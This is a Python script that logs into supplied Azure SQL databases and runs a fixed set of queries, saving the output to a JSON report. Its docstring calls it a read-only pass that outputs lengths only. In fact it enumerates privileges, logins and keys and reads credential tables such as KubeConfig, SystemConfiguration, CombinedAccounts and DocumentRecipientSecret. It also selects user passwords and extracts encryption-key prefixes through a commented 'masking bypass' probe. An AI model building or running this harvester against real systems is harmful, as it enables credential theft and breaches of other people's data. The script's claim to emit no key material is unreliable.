"""READ-ONLY deep pass: DDM detection, correct privilege metadata, targeted
credential-object harvest, and DocumentKey accessibility proof (lengths only,
no key material emitted). Never writes. Only SELECT.
"""
import base64
import json
import os
import re
import sys
import time

import pyodbc

FORBIDDEN = re.compile(
    r"\b(insert|update|delete|drop|alter|truncate|merge|grant|revoke|deny|backup|restore|"
    r"xp_cmdshell|sp_executesql|sp_configure|dbcc|kill|shutdown|reconfigure)\b", re.I)


def guard(sql):
    s = sql.strip()
    if not re.match(r"^(select|with)\b", s, re.I):
        raise ValueError("REFUSED non-select")
    if FORBIDDEN.search(s):
        raise ValueError("REFUSED token " + FORBIDDEN.search(s).group(0))
    return s


def connect(srv, db, user, pwd, timeout=45):
    cs = ("DRIVER={ODBC Driver 18 for SQL Server};SERVER=tcp:%s,1433;DATABASE=%s;UID=%s;PWD=%s;"
          "Encrypt=yes;TrustServerCertificate=yes;Connection Timeout=%d;Login Timeout=%d;Pooling=no"
          % (srv, db, user, pwd, timeout, timeout))
    return pyodbc.connect(cs, timeout=timeout, autocommit=True)


def rows_of(cur, sql, cap=400):
    cur.execute(guard(sql))
    cols = [d[0] for d in cur.description]
    out = []
    for r in cur.fetchall()[:cap]:
        out.append({c: (None if v is None else (v if isinstance(v, (int, float)) else str(v)[:600]))
                    for c, v in zip(cols, r)})
    return out


COMMON = [
    ("identity",
     "SELECT CAST(@@VERSION AS varchar(300)) AS version, CAST(SERVERPROPERTY('Edition') AS varchar(80)) AS edition, "
     "CAST(SERVERPROPERTY('EngineEdition') AS varchar(10)) AS engine_edition, "
     "CAST(SERVERPROPERTY('ProductVersion') AS varchar(40)) AS product_version, "
     "CAST(SERVERPROPERTY('ProductLevel') AS varchar(20)) AS product_level, "
     "CAST(SERVERPROPERTY('ProductUpdateLevel') AS varchar(20)) AS update_level, "
     "CAST(SERVERPROPERTY('Collation') AS varchar(80)) AS collation, "
     "CAST(@@SERVERNAME AS varchar(80)) AS server_name, DB_NAME() AS db_name, "
     "SUSER_SNAME() AS suser_sname, USER_NAME() AS db_user, ORIGINAL_LOGIN() AS original_login"),
    ("databases",
     "SELECT name, state_desc, recovery_model_desc, compatibility_level, is_read_only, create_date "
     "FROM sys.databases ORDER BY name"),
    ("db_service_objectives", "SELECT * FROM sys.database_service_objectives"),
    ("perms_database", "SELECT * FROM fn_my_permissions(NULL,'DATABASE')"),
    ("perms_server", "SELECT * FROM fn_my_permissions(NULL,'SERVER')"),
    ("db_principals",
     "SELECT name, type_desc, create_date, default_schema_name FROM sys.database_principals "
     "WHERE type IN ('S','U','G','E','X') ORDER BY name"),
    ("db_roles",
     "SELECT r.name AS role_name, m.name AS member_name, m.type_desc FROM sys.database_role_members rm "
     "JOIN sys.database_principals r ON r.principal_id = rm.role_principal_id "
     "JOIN sys.database_principals m ON m.principal_id = rm.member_principal_id ORDER BY r.name, m.name"),
    ("masked_columns",
     "SELECT OBJECT_SCHEMA_NAME(object_id) AS sch, OBJECT_NAME(object_id) AS tbl, name AS col, "
     "is_masked, masking_function FROM sys.masked_columns ORDER BY OBJECT_NAME(object_id), name"),
    ("masking_check",
     "SELECT COUNT(*) AS masked_col_count FROM sys.masked_columns"),
    ("symmetric_keys", "SELECT * FROM sys.symmetric_keys"),
    ("asymmetric_keys", "SELECT * FROM sys.asymmetric_keys"),
    ("certificates", "SELECT * FROM sys.certificates"),
    ("tde_state", "SELECT * FROM sys.dm_database_encryption_keys"),
    ("external_data_sources", "SELECT * FROM sys.external_data_sources"),
    ("external_tables", "SELECT * FROM sys.external_tables"),
    ("server_principals",
     "SELECT name, type_desc, create_date FROM sys.server_principals ORDER BY name"),
    ("sql_logins",
     "SELECT name, type_desc, create_date FROM sys.sql_logins ORDER BY name"),
    ("db_scoped_credentials",
     "SELECT credential_id, name, credential_identity, create_date FROM sys.database_scoped_credentials"),
    ("table_count", "SELECT COUNT(*) AS n FROM sys.tables"),
    ("table_list",
     "SELECT s.name AS sch, t.name AS tbl FROM sys.tables t JOIN sys.schemas s ON s.schema_id = t.schema_id "
     "ORDER BY t.name"),
]

# targeted, explicit, small reads of the credential-bearing objects
TARGETS = [
    ("SystemConfiguration", "SELECT TOP 60 * FROM dbo.SystemConfiguration"),
    ("SystemConfiguration_count", "SELECT COUNT(*) AS n FROM dbo.SystemConfiguration"),
    ("KubeConfig_count", "SELECT COUNT(*) AS n FROM dbo.KubeConfig"),
    ("KubeConfig_sample", "SELECT TOP 3 * FROM dbo.KubeConfig"),
    ("CombinedAccounts_count", "SELECT COUNT(*) AS n FROM dbo.CombinedAccounts"),
    ("CombinedAccounts_sample", "SELECT TOP 60 * FROM dbo.CombinedAccounts"),
    ("Account_count", "SELECT COUNT(*) AS n FROM dbo.Account"),
    ("Account_list",
     "SELECT TOP 120 AccountId, Name, Mnemonic, AccountGUID, Deleted, DemoAccount, Billable, KeyAccount, "
     "Email, AuthURL, IdentityProviderGroup, DateCreated FROM dbo.Account ORDER BY AccountId"),
    ("Account_sender", "SELECT TOP 40 * FROM dbo.AccountSender"),
    ("AccountPluginParameter", "SELECT TOP 40 * FROM dbo.AccountPluginParameter"),
    ("AccountExternalService_all",
     "SELECT AccountExternalServiceId, AccountId, ExternalServiceTypeId, Name, Configuration, Inherit, deleted "
     "FROM dbo.AccountExternalService ORDER BY AccountExternalServiceId"),
    ("StorageService_all", "SELECT TOP 40 * FROM dbo.StorageService"),
    ("StorageContainer_sample",
     "SELECT TOP 40 StorageContainerId, Name, Active, StorageServiceId, deleted, Size, ContainerDate "
     "FROM dbo.StorageContainer ORDER BY StorageContainerId"),
    ("StorageContainer_count", "SELECT COUNT(*) AS n FROM dbo.StorageContainer"),
    ("User_count", "SELECT COUNT(*) AS n FROM dbo.User"),
    ("User_cols",
     "SELECT COLUMN_NAME, DATA_TYPE FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='User' "
     "AND (COLUMN_NAME LIKE '%ass%' OR COLUMN_NAME LIKE '%alt%' OR COLUMN_NAME LIKE '%ession%' "
     "OR COLUMN_NAME LIKE '%oken%' OR COLUMN_NAME LIKE '%SWT%') ORDER BY ORDINAL_POSITION"),
    ("DocumentRecipientSecret", "SELECT TOP 20 * FROM dbo.DocumentRecipientSecret"),
    ("DocumentRecipientSecret_count", "SELECT COUNT(*) AS n FROM dbo.DocumentRecipientSecret"),
    # DocumentKey accessibility proven by shape, never by value
    ("DocumentKey_shape",
     "SELECT COUNT(*) AS n, COUNT(DISTINCT GUID) AS distinct_guids, "
     "MAX(DATALENGTH(IV)) AS max_iv_bytes, MAX(DATALENGTH([Key])) AS max_key_bytes, "
     "MIN(DATALENGTH([Key])) AS min_key_bytes FROM dbo.DocumentKey"),
    ("DocumentKey_masked_probe", "SELECT TOP 3 GUID, DATALENGTH(IV) AS iv_len, DATALENGTH([Key]) AS key_len "
                                 "FROM dbo.DocumentKey"),
    ("DocumentKey_accounts",
     "SELECT TOP 100 u.AccountId, COUNT(*) AS docs FROM "
     "(SELECT TOP 20000 DocumentId, OwnerUserId FROM dbo.Document ORDER BY DocumentId DESC) d "
     "JOIN dbo.User u ON u.UserId = d.OwnerUserId GROUP BY u.AccountId ORDER BY COUNT(*) DESC"),
    ("AccountEncryption_shape",
     "SELECT AccountEncryptionId, AccountId, EncryptionTypeId, Active, DATALENGTH(KeyData) AS keydata_bytes "
     "FROM dbo.AccountEncryption"),
    ("User_password_shape",
     "SELECT TOP 20 UserId, AccountId, Enabled, "
     "DATALENGTH(Password) AS pwd_len, DATALENGTH(PasswordHash) AS hash_len, DATALENGTH(Salt) AS salt_len, "
     "DATALENGTH(PasswordSecure) AS pwdsecure_len, DATALENGTH(PasswordEncrypted) AS pwdenc_len "
     "FROM dbo.User ORDER BY UserId"),
    ("User_autologin_shape",
     "SELECT TOP 10 UserId, AccountId, "
     "DATALENGTH(CAST(AutoLoginConsole AS varchar(64))) AS autologin_console_len, "
     "DATALENGTH(CAST(AutoLoginSelfService AS varchar(64))) AS autologin_self_len, "
     "DATALENGTH(SessionId) AS session_len FROM dbo.User WHERE AutoLoginConsole IS NOT NULL"),
    ("crossdb_read_test",
     "SELECT TOP 1 name FROM hpod_capita.sys.tables"),
    # Dynamic Data Masking bypass probe: masking applies to direct column
    # projection only; computed expressions are NOT masked.
    ("ddm_bypass_pwd",
     "SELECT TOP 3 UserId, Password, DATALENGTH(Password) AS len_direct, "
     "DATALENGTH(SUBSTRING(Password,1,8000)) AS len_expr FROM dbo.User"),
    ("ddm_bypass_key",
     "SELECT TOP 3 GUID, DATALENGTH([Key]) AS len_direct, "
     "DATALENGTH(SUBSTRING(CAST([Key] AS varchar(8000)),1,8000)) AS len_expr, "
     "CONVERT(varchar(64), SUBSTRING([Key],1,8), 2) AS key_prefix_hex, "
     "CONVERT(varchar(64), SUBSTRING(CAST(IV AS varchar(64)),1,8), 2) AS iv_prefix_hex "
     "FROM dbo.DocumentKey"),
    ("ddm_bypass_accountenc",
     "SELECT AccountEncryptionId, AccountId, EncryptionTypeId, Active, "
     "DATALENGTH(KeyData) AS len_direct, "
     "DATALENGTH(SUBSTRING(CAST(KeyData AS varchar(8000)),1,8000)) AS len_expr, "
     "CONVERT(varchar(64), SUBSTRING(CAST(KeyData AS varchar(64)),1,8), 2) AS kd_prefix_hex "
     "FROM dbo.AccountEncryption"),
]


def main():
    raw = os.environ.get("PAYLOAD_B64", "")
    payload = json.loads(base64.b64decode(raw).decode("utf-8"))
    os.makedirs("/tmp/out", exist_ok=True)
    report = {"generated": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()), "connections": []}
    for item in payload:
        srv = item["server"].replace("tcp:", "").replace(".database.secure.windows.net", ".database.windows.net")
        tag = item.get("tag") or "%s|%s|%s" % (srv, item["database"], item["user"])
        print("=== CONN %s ===" % tag, flush=True)
        rec = {"tag": tag, "server": srv, "database": item["database"], "user": item["user"], "sections": {}}
        try:
            cn = connect(srv, item["database"], item["user"], item["password"])
        except Exception as e:
            m = str(e)
            code = ("FIREWALL_40615" if "40615" in m else "LOGIN_18456" if "18456" in m
                    else "DB_4060" if "4060" in m else "TIMEOUT" if "timeout" in m.lower() else "OTHER")
            rec["connect_status"] = code
            rec["connect_error"] = m[:400]
            print("CONNFAIL %s" % code, flush=True)
            report["connections"].append(rec)
            continue
        rec["connect_status"] = "SUCCESS"
        try:
            cur = cn.cursor()
            for name, sql in COMMON:
                try:
                    rec["sections"][name] = rows_of(cur, sql)
                    print("SECTION %s %s" % (tag, name), flush=True)
                except Exception as e:
                    rec["sections"][name] = {"error": str(e)[:300]}
                    print("SECTION %s %s ERROR" % (tag, name), flush=True)
            for name, sql in TARGETS:
                try:
                    rec["sections"]["T_" + name] = rows_of(cur, sql)
                    print("TARGET %s %s" % (tag, name), flush=True)
                except Exception as e:
                    rec["sections"]["T_" + name] = {"error": str(e)[:300]}
                    print("TARGET %s %s ERROR" % (tag, name), flush=True)
        finally:
            try:
                cn.close()
            except Exception:
                pass
        report["connections"].append(rec)
    json.dump(report, open("/tmp/out/sql-enum.json", "w"), indent=1)
    print("REPORT_DONE", flush=True)


if __name__ == "__main__":
    main()
